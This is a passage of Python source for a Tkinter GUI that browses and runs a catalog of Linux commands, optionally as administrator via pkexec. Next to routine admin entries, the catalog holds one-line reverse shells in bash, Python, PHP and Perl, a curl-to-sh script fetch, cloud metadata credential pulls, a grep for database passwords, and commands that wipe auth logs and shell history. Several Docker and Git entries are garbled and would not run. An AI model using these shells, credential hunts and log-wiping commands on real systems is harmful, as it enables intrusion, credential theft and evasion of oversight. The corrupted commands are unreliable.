    Command('SSH & Remote', 'SSH Connect', '# ssh user@TARGET'),
    Command('SSH & Remote', 'SSH with Key', '# ssh -i ~/.ssh/id_rsa user@TARGET'),
    Command('SSH & Remote', 'SSH Custom Port', '# ssh -p PORT user@TARGET'),
    Command('SSH & Remote', 'SSH Verbose', '# ssh -vvv user@TARGET'),
    Command('SSH & Remote', 'SSH Jump Host', '# ssh -J jumpuser@JUMP user@TARGET'),
    Command('SSH & Remote', 'Generate ed25519 Key', "ssh-keygen -t ed25519 -C 'your@email.com'"),
    Command('SSH & Remote', 'Generate RSA 4096 Key', "ssh-keygen -t rsa -b 4096 -C 'your@email.com'"),
    Command('SSH & Remote', 'Copy SSH Key', '# ssh-copy-id user@TARGET'),
    Command('SSH & Remote', 'SSH Tunnel (Local)', '# ssh -L 8080:localhost:80 user@TARGET'),
    Command('SSH & Remote', 'SSH Tunnel (Remote)', '# ssh -R 8080:localhost:80 user@TARGET'),
    Command('SSH & Remote', 'SSH SOCKS Proxy', '# ssh -D 9050 user@TARGET'),
    Command('SSH & Remote', 'SCP Upload', '# scp file.txt user@TARGET:/path/'),
    Command('SSH & Remote', 'SCP Download', '# scp user@TARGET:/path/file.txt ./'),
    Command('SSH & Remote', 'SCP Recursive', '# scp -r folder/ user@TARGET:/path/'),
    Command('SSH & Remote', 'Rsync Sync', '# rsync -avz /local/ user@TARGET:/remote/'),
    Command('SSH & Remote', 'Rsync over SSH', '# rsync -avz -e ssh /local/ user@TARGET:/remote/'),
    Command('SSH & Remote', 'SSH Config', 'cat ~/.ssh/config 2>/dev/null'),
    Command('SSH & Remote', 'Known Hosts', 'cat ~/.ssh/known_hosts 2>/dev/null | head -20'),
    Command('SSH & Remote', 'SSH Keyscan', '# ssh-keyscan TARGET'),
    Command('SSH & Remote', 'Netcat Listener', '# nc -lvnp 4444'),
    Command('SSH & Remote', 'Netcat Connect', '# nc TARGET 4444'),
    Command('SSH & Remote', 'Socat Redirect', '# socat TCP-LISTEN:4444,fork TCP:TARGET:4444'),
    Command('CTF Tools', 'Base64 Encode', "# echo 'text' | base64"),
    Command('CTF Tools', 'Base64 Decode', "# echo 'dGV4dA==' | base64 -d"),
    Command('CTF Tools', 'Base32 Decode', "# echo 'ORSXG5A=' | base32 -d"),
    Command('CTF Tools', 'ROT13', "# echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"),
    Command('CTF Tools', 'Caesar All Shifts', '# python3 -c "s=\'CIPHER\'; [print(i,\'\'.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]"'),
    Command('CTF Tools', 'Hex Encode', "# echo 'text' | xxd -p"),
    Command('CTF Tools', 'Hex Decode', "# echo '74657874' | xxd -r -p"),
    Command('CTF Tools', 'URL Decode', '# python3 -c "import urllib.parse; print(urllib.parse.unquote(\'URL\'))"'),
    Command('CTF Tools', 'URL Encode', '# python3 -c "import urllib.parse; print(urllib.parse.quote(\'text\'))"'),
    Command('CTF Tools', 'MD5 Hash', "# echo -n 'text' | md5sum"),
    Command('CTF Tools', 'SHA1 Hash', "# echo -n 'text' | sha1sum"),
    Command('CTF Tools', 'SHA256 Hash', "# echo -n 'text' | sha256sum"),
    Command('CTF Tools', 'RSA Pubkey', '# openssl rsa -in key.pem -pubout'),
    Command('CTF Tools', 'RSA Encrypt', '# openssl rsautl -encrypt -inkey pub.pem -pubin -in plain.txt -out enc.bin'),
    Command('CTF Tools', 'Stego LSB', '# python3 -c "from PIL import Image; img=Image.open(\'image.png\'); print([p&1 for p in list(img.convert(\'L\').getdata())[:64]])" 2>/dev/null'),
    Command('CTF Tools', 'zsteg', '# zsteg image.png'),
    Command('CTF Tools', 'PDF Crack', '# pdfcrack -f document.pdf -w /usr/share/wordlists/rockyou.txt'),
    Command('CTF Tools', 'ZIP Crack', '# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip'),
    Command('CTF Tools', 'Netcat File Send', '# nc -lvnp 4444 > file  # receiver side'),
    Command('CTF Tools', 'Netcat File Recv', '# nc TARGET 4444 < file  # sender side'),
    Command('CTF Tools', 'CyberChef Open', "# xdg-open https://gchq.github.io/CyberChef/ 2>/dev/null || echo 'Open in browser: https://gchq.github.io/CyberChef/'"),
    Command('Docker', 'Docker Version', 'docker version 2>/dev/null'),
    Command('Docker', 'Docker Info', 'docker info 2>/dev/null'),
    Command('Docker', 'List Containers', 'docker ps -a'),
    Command('Docker', 'List Images', 'docker images'),
    Command('Docker', 'Pull Image', '# docker pull IMAGE:TAG'),
    Command('Docker', 'Run Container', '# docker run -it IMAGE /bin/bash'),
    Command('Docker', 'Run with Ports', '# docker run -d -p 8080:80 IMAGE'),
    Command('Docker', 'Run with Volume', '# docker run -v /host:/container IMAGE'),
    Command('Docker', 'Stop Container', '# docker stop CONTAINER_ID'),
    Command('Docker', 'Remove Container', '# docker rm CONTAINER_ID'),
    Command('Docker', 'Remove Image', '# docker rmi IMAGE_ID'),
    Command('Docker', 'Exec into Container', '# docker exec -it CONTAINER_ID /bin/bash'),
    Command('Docker', 'DockeLogss', '# dockeLogss CONTAINER_ID'),
    Command('Docker', 'Docker Inspect', '# docker inspect CONTAINER_ID'),
    Command('Docker', 'Docker Networks', 'docker network ls 2>/dev/null'),
    Command('Docker', 'Docker Volumes', 'docker volume ls 2>/dev/null'),
    Command('Docker', 'Compose Up', '# docker-compose up -d'),
    Command('Docker', 'Compose Down', '# docker-compose down'),
    Command('Docker', 'ComposLogss', '# docker-composLogss -f'),
    Command('Docker', 'Docker Stats', 'docker stats --no-stream 2>/dev/null'),
    Command('Docker', 'Prune Everything', '# docker system prune -af'),
    Command('Docker', 'Docker Socket Check', 'ls -la /var/run/docker.sock 2>/dev/null'),
    Command('Docker', 'Build Image', '# docker build -t myimage:tag .'),
    Command('Cloud & AWS', 'AWS CLI Version', 'aws --version 2>/dev/null'),
    Command('Cloud & AWS', 'AWS Configure', '# aws configure'),
    Command('Cloud & AWS', 'AWS Current User', 'aws sts get-caller-identity 2>/dev/null'),
    Command('Cloud & AWS', 'AWS IAM List Users', '# aws iam list-users'),
    Command('Cloud & AWS', 'AWS IAM List Roles', '# aws iam list-roles'),
    Command('Cloud & AWS', 'AWS S3 List Buckets', '# aws s3 ls'),
    Command('Cloud & AWS', 'AWS S3 List Contents', '# aws s3 ls s3://BUCKET_NAME'),
    Command('Cloud & AWS', 'AWS S3 Download', '# aws s3 cp s3://BUCKET_NAME/file ./'),
    Command('Cloud & AWS', 'AWS EC2 Instances', "# aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table"),
    Command('Cloud & AWS', 'AWS SSM Parameters', "# aws ssm get-parameters-by-path --path '/' --recursive --with-decryption"),
    Command('Cloud & AWS', 'AWS Secrets Manager', '# aws secretsmanager list-secrets'),
    Command('Cloud & AWS', 'IMDS Instance Metadata', 'curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null'),
    Command('Cloud & AWS', 'IMDS IAM Credentials', 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null'),
    Command('Cloud & AWS', 'GCP gcloud Version', 'gcloud --version 2>/dev/null'),
    Command('Cloud & AWS', 'GCP Auth List', 'gcloud auth list 2>/dev/null'),
    Command('Cloud & AWS', 'GCP List Projects', 'gcloud projects list 2>/dev/null'),
    Command('Cloud & AWS', 'Azure CLI Version', 'az --version 2>/dev/null'),
    Command('Cloud & AWS', 'Azure Account List', 'az account list 2>/dev/null'),
    Command('Cloud & AWS', 'Kubernetes Get Pods', 'kubectl get pods --all-namespaces 2>/dev/null'),
    Command('Cloud & AWS', 'Kubernetes Get Secrets', '# kubectl get secrets --all-namespaces'),
    Command('Cloud & AWS', 'Terraform Version', 'terraform --version 2>/dev/null'),
    Command('Cloud & AWS', 'ScoutSuite Cloud Audit', '# scout aws 2>/dev/null'),
    Command('Databases', 'MySQL Login', '# mysql -u root -p'),
    Command('Databases', 'MySQL Show DBs', "# mysql -u root -p -e 'show databases;'"),
    Command('Databases', 'MySQL Show Users', "# mysql -u root -p -e 'select user,host from mysql.user;'"),
    Command('Databases', 'MySQL Dump', '# mysqldump -u root -p DATABASE > backup.sql'),
    Command('Databases', 'MySQL Import', '# mysql -u root -p DATABASE < backup.sql'),
    Command('Databases', 'PostgreSQL Login', '# sudo -u postgres psql'),
    Command('Databases', 'PostgreSQL List DBs', "# sudo -u postgres psql -c '\\l'"),
    Command('Databases', 'PostgreSQL List Tables', "# sudo -u postgres psql -c '\\dt' DATABASE"),
    Command('Databases', 'Redis CLI', '# redis-cli'),
    Command('Databases', 'Redis Auth Test', '# redis-cli AUTH password'),
    Command('Databases', 'Redis All Keys', "# redis-cli KEYS '*'"),
    Command('Databases', 'MongoDB Connect', '# mongosh'),
    Command('Databases', 'MongoDB Show DBs', "# mongosh --eval 'show dbs'"),
    Command('Databases', 'SQLite Open DB', '# sqlite3 database.db'),
    Command('Databases', 'SQLite Schema', '# sqlite3 database.db .schema'),
    Command('Databases', 'Find MySQL Config', "find / -name 'my.cnf' 2>/dev/null"),
    Command('Databases', 'Find Postgres Config', "find / -name 'postgresql.conf' 2>/dev/null"),
    Command('Databases', 'DB Credentials Hunt', "grep -r 'password\\|passwd\\|db_pass' /var/www/ 2>/dev/null | grep -v Binary | head -20"),
    Command('Databases', 'Elasticsearch Query', "# curl -X GET 'http://TARGET:9200/_cat/indices?v'"),
    Command('Scripting', 'Python3 Version', 'python3 --version'),
    Command('Scripting', 'Python3 HTTP Server', 'python3 -m http.server 8080'),
    Command('Scripting', 'Python3 PTY Shell', 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"'),
    Command('Scripting', 'Bash Reverse Shell', '# bash -i >& /dev/tcp/TARGET/4444 0>&1'),
    Command('Scripting', 'Python Reverse Shell', '# python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("TARGET",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''),
    Command('Scripting', 'PHP Reverse Shell', '# php -r \'$s=fsockopen("TARGET",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''),
    Command('Scripting', 'Perl Reverse Shell', '# perl -e \'use Socket;$i="TARGET";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\''),
    Command('Scripting', 'Upgrade Shell (TTY)', 'python3 -c \'import pty; pty.spawn("/bin/bash")\' ; export TERM=xterm'),
    Command('Scripting', 'Stty TTY Upgrade', '# stty raw -echo; fg'),
    Command('Scripting', 'Curl Download', '# curl -O http://TARGET/file'),
    Command('Scripting', 'Wget Download', '# wget http://TARGET/file'),
    Command('Scripting', 'Curl POST JSON', '# curl -X POST -H \'Content-Type: application/json\' -d \'{"key":"val"}\' http://TARGET/api'),
    Command('Scripting', 'Generate Password', 'openssl rand -base64 24'),
    Command('Scripting', 'Generate UUID', "python3 -c 'import uuid; print(uuid.uuid4())'"),
    Command('Scripting', 'LinPEAS', '# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'),
    Command('Scripting', 'Watch Command', "# watch -n 1 'ps aux | head -20'"),
    Command('Scripting', 'Parallel Jobs', "# echo {1..10} | xargs -n1 -P4 -I{} sh -c 'echo processing {}'"),
    Command('Scripting', 'Crontab Privesc Check', 'cat /etc/crontab; ls -la /etc/cron* 2>/dev/null'),
    Command('Git & Devv', 'Git Version', 'git --version'),
    Command('Git & Devv', 'Git Init', '# git init'),
    Command('Git & Devv', 'Git Clone', '# git clone URL'),
    Command('Git & Devv', 'Git Status', "git status 2>/dev/null || echo 'Not a git repo'"),
    Command('Git & Devv', 'Git Log (pretty)', 'git log --oneline --graph --all 2>/dev/null | head -20'),
    Command('Git & Devv', 'Git Diff', 'git diff 2>/dev/null'),
    Command('Git & Devv', 'Git Add All', '# git add -A'),
    Command('Git & Devv', 'Git Commit', "# git commit -m 'message'"),
    Command('Git & Devv', 'Git Push', '# git push origin main'),
    Command('Git & Devv', 'Git Pull', '# git pull'),
    Command('Git & Devv', 'Git Branches', 'git branch -a 2>/dev/null'),
    Command('Git & Devv', 'Git Stash', '# git stash'),
    Command('Git & Devv', 'Git Reset Hard', '# git reset --hard HEAD'),
    Command('Git & Devv', 'GitHub API Search', "# curl 'https://api.github.com/search/repositories?q=QUERY'"),
    Command('Git & Devv', 'Gitdumper', '# python3 git-dumper.py http://TARGET/.git/ output/'),
    Command('Git & Devv', 'Trufflehog Secrets', '# trufflehog git https://github.com/USER/REPO'),
    Command('Git & Devv', 'Gitleaks Scan', '# gitleaks detect --source .'),
    Command('Logs', 'Auth Log', 'sudo tail -100 /var/log/auth.log 2>/dev/null'),
    Command('Logs', 'Syslog', 'sudo tail -100 /var/log/syslog 2>/dev/null'),
    Command('Logs', 'Kernel Log', 'sudo dmesg | tail -30'),
    Command('Logs', 'Kernel Errors', 'sudo dmesg --level=err,warn 2>/dev/null | tail -20'),
    Command('Logs', 'Apache Access Log', 'sudo tail -50 /var/log/apache2/access.log 2>/dev/null'),
    Command('Logs', 'Apache Error Log', 'sudo tail -50 /var/log/apache2/error.log 2>/dev/null'),
    Command('Logs', 'Nginx Access Log', 'sudo tail -50 /var/log/nginx/access.log 2>/dev/null'),
    Command('Logs', 'MySQL Error Log', 'sudo tail -50 /var/log/mysql/error.log 2>/dev/null'),
    Command('Logs', 'journalctl Recent', 'journalctl -n 50 --no-pager 2>/dev/null'),
    Command('Logs', 'journalctl Errors', 'journalctl -p err -n 50 --no-pager 2>/dev/null'),
    Command('Logs', 'journalctl Service', '# journalctl -u SERVICE_NAME -f'),
    Command('Logs', 'journalctl Since', "# journalctl --since '1 hour ago'"),
    Command('Logs', 'All Log Files', 'ls -laht /var/log/ 2>/dev/null'),
    Command('Logs', 'Bash History', 'cat ~/.bash_history 2>/dev/null | tail -30'),
    Command('Logs', 'Zsh History', 'cat ~/.zsh_history 2>/dev/null | tail -30'),
    Command('Logs', 'Grep ErrorLogs', "sudo grep -rn 'ERROR\\|CRITICAL\\|FATAL' /var/log/ 2>/dev/null | tail -20"),
    Command('Logs', 'Clear Auth Log', '# sudo truncate -s 0 /var/log/auth.log'),
    Command('Logs', 'Clear Bash History', '# history -c && history -w'),
    Command('Monitoring', 'Live CPU (top)', 'top -bn1 | head -20'),
    Command('Monitoring', 'Htop', 'htop 2>/dev/null || top'),
    Command('Monitoring', 'Memory Detail', 'cat /proc/meminfo | head -30'),
    Command('Monitoring', 'IO Stats', 'iostat -xz 1 3 2>/dev/null || vmstat 1 5'),
    Command('Monitoring', 'Disk IO', 'sudo iotop -b -n 1 2>/dev/null'),
    Command('Monitoring', 'Per-Process IO', 'sudo pidstat -d 1 3 2>/dev/null'),
    Command('Monitoring', 'CPU Frequency', 'cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq 2>/dev/null | awk \'{print $1/1000 " MHz"}\''),
    Command('Monitoring', 'Load Average', 'cat /proc/loadavg'),
    Command('Monitoring', 'Interrupt Stats', 'cat /proc/interrupts | head -20'),
    Command('Monitoring', 'Context Switches', 'vmstat 1 5 2>/dev/null'),
    Command('Monitoring', 'Network Bytes', 'cat /proc/net/dev | column -t'),
    Command('Monitoring', 'TCP Retransmits', 'netstat -s 2>/dev/null | grep -i retransmit'),
    Command('Monitoring', 'Swap Usage', 'vmstat -s | grep -i swap'),
    Command('Monitoring', 'SAR Stats', 'sar 1 5 2>/dev/null'),
    Command('Monitoring', 'Glances', 'glances --one-line 2>/dev/null'),
    Command('Monitoring', 'Watch Memory', "watch -n 1 'free -h'"),
    Command('Monitoring', 'Watch Disk', "watch -n 5 'df -h'"),
    Command('Monitoring', 'Watch Processes', "watch -n 2 'ps aux --sort=-%cpu | head -15'"),
    Command('Monitoring', 'Uptime & Load', 'uptime && cat /proc/loadavg'),
    Command('Monitoring', 'System Journal Boot', 'journalctl -b --no-pager 2>/dev/null | tail -30'),
)

DEFAULT_COMMANDS = {
    "Create Symlink": {
        "template": 'ln -s "{source}" "{destination}"',
        "needs_admin": False,
        "description": "Create a symbolic link from source to destination."
    },
    "Copy File/Folder": {
        "template": 'cp -rv "{source}" "{destination}"',
        "needs_admin": False,
        "description": "Copy a file or folder recursively."
    },
    "Move File/Folder": {
        "template": 'mv -v "{source}" "{destination}"',
        "needs_admin": False,
        "description": "Move or rename a file or folder."
    },
    "Rsync Copy": {
        "template": 'rsync -avh --progress "{source}" "{destination}"',
        "needs_admin": False,
        "description": "Copy with rsync while preserving attributes and showing progress."
    },
    "List Source": {
        "template": 'ls -lah "{source}"',
        "needs_admin": False,
        "description": "Show a detailed directory listing."
    },
    "Disk Usage Source": {
        "template": 'du -sh "{source}"',
        "needs_admin": False,
        "description": "Show total disk space used by the source."
    },
    "Delete Empty Folders": {
        "template": 'find "{source}" -type d -empty -delete',
        "needs_admin": False,
        "description": "Recursively delete empty folders below the selected source."
    },
    "chmod 777 Recursive": {
        "template": 'chmod -R 777 "{source}"',
        "needs_admin": True,
        "description": "Recursively give read/write/execute permissions to everyone."
    },
    "chmod User Read/Write": {
        "template": 'chmod -R u+rwX "{source}"',
        "needs_admin": True,
        "description": "Give the owner read/write access and directory execute access."
    },
    "Change Owner to Current User": {
        "template": 'chown -R {username}:{username} "{source}"',
        "needs_admin": True,
        "description": "Change ownership recursively to your current Linux user."
    },
    "Unmount Source": {
        "template": 'umount "{source}"',
        "needs_admin": True,
        "description": "Unmount the selected mount point or device."
    },
}

COMMAND_FILE = Path.home() / ".linux_command_frontend_commands.json"


class ProcessRunner:
    """Shared background shell runner used by both tabs."""

    def __init__(self, owner: tk.Misc, output_callback, status_callback):
        self.owner = owner
        self.output_callback = output_callback
        self.status_callback = status_callback
        self.process: subprocess.Popen[str] | None = None

    def run(self, command: str, cwd: Path, admin: bool = False) -> None:
        if self.process and self.process.poll() is None:
            messagebox.showinfo("Command running", "Stop the current command first.")
            return

        if admin and not shutil.which("pkexec"):
            messagebox.showerror(
                "Administrator mode",
                "pkexec was not found. Install/use PolicyKit (polkit) or turn off administrator mode.",
            )
            return

        shown = f"pkexec sh -c {shlex.quote(command)}" if admin else command
        self.output_callback(f"\n$ {shown}\n")
        self.status_callback("Running...")
        threading.Thread(
            target=self._worker, args=(command, cwd, admin), daemon=True
        ).start()

    def _worker(self, command: str, cwd: Path, admin: bool) -> None:
        proc = None
        try:
            args = ["pkexec", "sh", "-c", command] if admin else ["sh", "-c", command]
            proc = subprocess.Popen(
                args,
                cwd=cwd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="replace",
                start_new_session=True,
            )
            self.process = proc
            if proc.stdout:
                for line in proc.stdout:
                    self.owner.after(0, self.output_callback, line)
            code = proc.wait()
            self.owner.after(0, self.output_callback, f"\n[exit code {code}]\n")
        except OSError as exc:
            self.owner.after(0, self.output_callback, f"\nError: {exc}\n")
        finally:
            if proc is not None and self.process is proc:
                self.process = None
            self.owner.after(0, self.status_callback, "Ready")

    def stop(self) -> None:
        proc = self.process
        if not proc or proc.poll() is not None:
            self.status_callback("No command is running")
            return
        try:
            os.killpg(proc.pid, signal.SIGTERM)
            self.status_callback("Stopping...")
        except ProcessLookupError:
            self.process = None


class OutputPane(ttk.LabelFrame):
    def __init__(self, master, title="Output"):
        super().__init__(master, text=title, padding=6)
        self.rowconfigure(0, weight=1)
        self.columnconfigure(0, weight=1)
        self.text = scrolledtext.ScrolledText(
            self, wrap="word", font=("DejaVu Sans Mono", 10),
            background="#101820", foreground="#d8f3dc", insertbackground="white",
            selectbackground="#2f6690", relief="sunken", borderwidth=3,
            padx=8, pady=8, undo=True,
        )
        self.text.grid(row=0, column=0, sticky="nsew")

    def append(self, text: str) -> None:
        self.text.insert("end", text)
        self.text.see("end")

    def clear(self) -> None:
        self.text.delete("1.0", "end")


class CommanderTab(ttk.Frame):
    def __init__(self, master):
        super().__init__(master, padding=8)
        self.search_var = tk.StringVar()
        self.command_var = tk.StringVar()
        self.cwd_var = tk.StringVar(value=str(Path.home()))
        self.admin_var = tk.BooleanVar(value=False)
        self.status_var = tk.StringVar(value="Ready")
        self.cwd = Path.home()
        self.history: list[str] = []
        self.history_index = 0
        self._build()
        self.runner = ProcessRunner(self, self.output.append, self.status_var.set)
        self._load_categories()
        self._refresh_commands()

    def _build(self):
        self.columnconfigure(1, weight=1)
        self.rowconfigure(1, weight=1)
        ttk.Label(self, text="Search:").grid(row=0, column=0, sticky="w", padx=(0, 6))
        search = ttk.Entry(self, textvariable=self.search_var, style="Deep.TEntry")
        search.grid(row=0, column=1, sticky="ew")
        search.bind("<KeyRelease>", lambda e: self._refresh_commands())
        ttk.Checkbutton(
            self, text="Run as administrator", variable=self.admin_var
        ).grid(row=0, column=2, padx=8)
        ttk.Button(self, text="Clear Search", command=self._clear_search, style="Secondary.TButton").grid(row=0, column=3)

        pane = ttk.Panedwindow(self, orient="horizontal")
        pane.grid(row=1, column=0, columnspan=4, sticky="nsew", pady=8)
        left, right = ttk.Frame(pane), ttk.Frame(pane)
        pane.add(left, weight=1); pane.add(right, weight=4)

        ttk.Label(left, text="Categories").pack(anchor="w")
        self.categories = tk.Listbox(
            left, exportselection=False, width=25, relief="sunken", borderwidth=3,
            background="#edf6f9", selectbackground="#1565c0", selectforeground="white",
        )
        self.categories.pack(fill="both", expand=True, pady=(4, 0))
        self.categories.bind("<<ListboxSelect>>", lambda e: self._refresh_commands())

        right.columnconfigure(0, weight=1)
        right.rowconfigure(0, weight=2)
        right.rowconfigure(2, weight=3)
        self.tree = ttk.Treeview(right, columns=("name", "command"), show="headings")
        self.tree.heading("name", text="Name"); self.tree.heading("command", text="Command")
        self.tree.column("name", width=230, stretch=False)
        self.tree.column("command", width=650)
        tree_scroll = ttk.Scrollbar(right, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        tree_scroll.grid(row=0, column=1, sticky="ns")
        self.tree.bind("<<TreeviewSelect>>", self._load_selected)
        self.tree.bind("<Double-1>", lambda _e: self.run())

        box = ttk.LabelFrame(right, text="Command", padding=6)
        box.grid(row=1, column=0, sticky="ew", pady=7)
        box.columnconfigure(0, weight=1)
        entry = ttk.Entry(box, textvariable=self.command_var, style="Deep.TEntry")
        entry.grid(row=0, column=0, sticky="ew")
        entry.bind("<Return>", lambda e: self.run())
        ttk.Button(box, text="▶ Run", command=self.run, style="Run.TButton").grid(row=0, column=1, padx=3)
        ttk.Button(box, text="■ Stop", command=lambda: self.runner.stop(), style="Stop.TButton").grid(row=0, column=2, padx=3)
        ttk.Button(box, text="Copy", command=self.copy_command, style="Secondary.TButton").grid(row=0, column=3, padx=3)
        ttk.Label(box, text="Working folder:").grid(row=1, column=0, sticky="w", pady=(6,0))
        ttk.Entry(box, textvariable=self.cwd_var, state="readonly", style="Deep.TEntry").grid(row=2, column=0, sticky="ew")
        ttk.Button(box, text="Browse...", command=self.choose_folder).grid(row=2, column=1, padx=3)

        ttk.Label(box, text="Recent command:").grid(row=3, column=0, sticky="w", pady=(6, 0))
        self.history_combo = ttk.Combobox(box, state="readonly")
        self.history_combo.grid(row=4, column=0, sticky="ew")
        self.history_combo.bind("<<ComboboxSelected>>", self._recall_history)

        self.output = OutputPane(right)
        self.output.grid(row=2, column=0, sticky="nsew")
        controls = ttk.Frame(right)
        controls.grid(row=3, column=0, sticky="w", pady=(5,0))
        ttk.Button(controls, text="Clear Output", command=self.output.clear, style="Secondary.TButton").pack(side="left")
        ttk.Button(controls, text="Save Output", command=self.save_output).pack(side="left", padx=4)

        ttk.Label(self, textvariable=self.status_var).grid(row=2, column=0, columnspan=4, sticky="w")

    def _load_categories(self):
        self.categories.insert("end", "All Commands")
        for category in sorted({c.category for c in COMMANDS}, key=str.casefold):
            self.categories.insert("end", category)
        self.categories.selection_set(0)

    def _selected_category(self):
        s = self.categories.curselection()
        return self.categories.get(s[0]) if s else "All Commands"

    def _refresh_commands(self):
        self.tree.delete(*self.tree.get_children())
        category = self._selected_category()
        query = self.search_var.get().strip().casefold()
        matches = [
            c for c in COMMANDS
            if (category == "All Commands" or c.category == category)
            and (not query or query in c.name.casefold() or query in c.text.casefold())
        ]
        for i, c in enumerate(matches):
            self.tree.insert("", "end", iid=str(i), values=(c.name, c.text.lstrip("# ")))
        self.status_var.set(f"{len(matches)} command(s) shown")

    def _load_selected(self, _event=None):
        s = self.tree.selection()
        if s:
            self.command_var.set(self.tree.item(s[0], "values")[1])

    def _clear_search(self):
        self.search_var.set(""); self._refresh_commands()

    def choose_folder(self):
        p = filedialog.askdirectory(initialdir=self.cwd)
        if p:
            self.cwd = Path(p); self.cwd_var.set(p)

    def run(self):
        command = self.command_var.get().strip()
        if not command:
            return
        destructive = ("rm ", " -delete", "chmod -R 777", "chown -R", "mkfs", "dd if=")
        if any(x in command for x in destructive):
            if not messagebox.askyesno("Confirm command", f"This command can make significant changes:\n\n{command}\n\nRun it?"):
                return
        if not self.history or self.history[-1] != command:
            self.history.append(command)
            self.history = self.history[-50:]
            self.history_combo["values"] = tuple(reversed(self.history))
        self.history_index = len(self.history)
        self.runner.run(command, self.cwd, self.admin_var.get())

    def _recall_history(self, _event=None):
        command = self.history_combo.get()
        if command:
            self.command_var.set(command)

    def copy_command(self):
        self.clipboard_clear(); self.clipboard_append(self.command_var.get())
        self.status_var.set("Command copied to clipboard")

    def save_output(self):
        p = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt"), ("All files", "*.*")])
        if p:
            Path(p).write_text(self.output.text.get("1.0", "end-1c"), encoding="utf-8")


class CreatorTab(ttk.Frame):
    """Integrated version of the user's Linux Command Frontend Builder."""

    def __init__(self, master):
        super().__init__(master, padding=10)
        self.source_var = tk.StringVar()
        self.destination_var = tk.StringVar()
        self.name_var = tk.StringVar()
        self.template_var = tk.StringVar()
        self.preview_var = tk.StringVar()
        self.description_var = tk.StringVar()
        self.admin_var = tk.BooleanVar()
        self.status_var = tk.StringVar(value="Ready")
        self.username = getpass.getuser()
        self.commands = self.load_commands()
        self._build()
        self.runner = ProcessRunner(self, self.output.append, self.status_var.set)
        self.populate()
        if self.commands:
            self.combo.set(next(iter(self.commands))); self.load_selected()

    def _build(self):
        self.columnconfigure(1, weight=1); self.rowconfigure(9, weight=1)
        pad = dict(padx=5, pady=5)
        ttk.Label(self, text="Command Creator", font=("TkDefaultFont", 14, "bold")).grid(row=0, column=0, columnspan=4, sticky="w", **pad)
        ttk.Label(self, text="Build commands with {source}, {destination}, and {username}, then preview, save, or run them.").grid(row=1, column=0, columnspan=4, sticky="w", **pad)

        ttk.Label(self, text="Source:").grid(row=2, column=0, sticky="w", **pad)
        ttk.Entry(self, textvariable=self.source_var, style="Deep.TEntry").grid(row=2, column=1, sticky="ew", **pad)
        ttk.Button(self, text="File", command=lambda: self.pick(self.source_var, False)).grid(row=2, column=2)
        ttk.Button(self, text="Folder", command=lambda: self.pick(self.source_var, True)).grid(row=2, column=3)

        ttk.Label(self, text="Destination:").grid(row=3, column=0, sticky="w", **pad)
        ttk.Entry(self, textvariable=self.destination_var, style="Deep.TEntry").grid(row=3, column=1, sticky="ew", **pad)
        ttk.Button(self, text="File", command=self.pick_destination_file).grid(row=3, column=2)
        ttk.Button(self, text="Folder", command=lambda: self.pick(self.destination_var, True)).grid(row=3, column=3)

        ttk.Label(self, text="Saved Command:").grid(row=4, column=0, sticky="w", **pad)
        self.combo = ttk.Combobox(self, textvariable=self.name_var, state="readonly")
        self.combo.grid(row=4, column=1, columnspan=2, sticky="ew", **pad)
        self.combo.bind("<<ComboboxSelected>>", lambda e: self.load_selected())
        ttk.Button(self, text="Delete", command=self.delete).grid(row=4, column=3)

        ttk.Label(self, text="Description:").grid(row=5, column=0, sticky="w", **pad)
        ttk.Label(self, textvariable=self.description_var, wraplength=760).grid(row=5, column=1, columnspan=3, sticky="w", **pad)

        ttk.Label(self, text="Template:").grid(row=6, column=0, sticky="w", **pad)
        ent = ttk.Entry(self, textvariable=self.template_var, style="Deep.TEntry")
        ent.grid(row=6, column=1, columnspan=3, sticky="ew", **pad)
        ent.bind("<KeyRelease>", lambda e: self.update_preview())

        ttk.Checkbutton(self, text="Run as administrator (pkexec)", variable=self.admin_var, command=self.update_preview).grid(row=7, column=1, sticky="w")
        ttk.Label(self, text="Preview:").grid(row=8, column=0, sticky="w", **pad)
        ttk.Entry(self, textvariable=self.preview_var, state="readonly", style="Deep.TEntry").grid(row=8, column=1, columnspan=3, sticky="ew", **pad)

        self.output = OutputPane(self)
        self.output.grid(row=9, column=0, columnspan=4, sticky="nsew", pady=6)

        buttons = ttk.Frame(self); buttons.grid(row=10, column=0, columnspan=4, sticky="ew")
        actions = [
            ("▶ Run", self.run, "Run.TButton"),
            ("■ Stop", lambda: self.runner.stop(), "Stop.TButton"),
            ("Save As New", self.save_new, "Accent.TButton"),
            ("Update Selected", self.update_saved, "Secondary.TButton"),
            ("Clear Output", self.output.clear, "Secondary.TButton"),
        ]
        for text, cmd, style in actions:
            ttk.Button(buttons, text=text, command=cmd, style=style).pack(side="left", padx=3)
        ttk.Label(buttons, textvariable=self.status_var).pack(side="right")

        self.source_var.trace_add("write", lambda *_: self.update_preview())
        self.destination_var.trace_add("write", lambda *_: self.update_preview())

    def pick(self, variable, folder):
        p = filedialog.askdirectory() if folder else filedialog.askopenfilename()
        if p: variable.set(p)

    def pick_destination_file(self):
        p = filedialog.asksaveasfilename()
        if p: self.destination_var.set(p)

